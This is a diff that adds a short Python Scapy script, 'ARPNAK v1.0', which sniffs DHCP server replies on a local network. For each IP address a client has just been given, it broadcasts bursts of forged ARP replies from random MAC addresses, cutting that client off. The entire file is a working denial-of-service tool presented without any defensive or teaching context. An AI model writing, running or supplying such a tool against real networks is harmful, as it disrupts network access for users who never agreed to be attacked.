@@ -1,0 +1,23 @@
+#-*-coding:utf8-*-
+from scapy.all import *
+print "ARPNAK v1.0 by bus7d/2014"
+IFACE=raw_input("Enter interface:")
+
+def arpnak(pkt):
+	
+	if pkt.haslayer(UDP) and pkt.getlayer(IP).dst=="255.255.255.255" and pkt.getlayer(UDP).sport==67 and pkt.haslayer(DHCP):
+		pkt.show()
+		c=20
+		ack=pkt.getlayer(DHCP).options
+		
+		for ack in ack:
+			vip=pkt.getlayer(BOOTP).yiaddr
+			
+			arnak=Ether(dst="FF:FF:FF:FF:FF:FF")/ARP(op=2,hwsrc=RandMAC(),hwdst="FF:FF:FF:FF:FF:FF",psrc=vip,pdst="255.255.255.255")
+		
+			while c>0:
+				sendp(arnak)
+				c=c-1
+			arnak.show()
+
+pkt=sniff(iface=IFACE,filter='udp port 67',prn=arpnak)
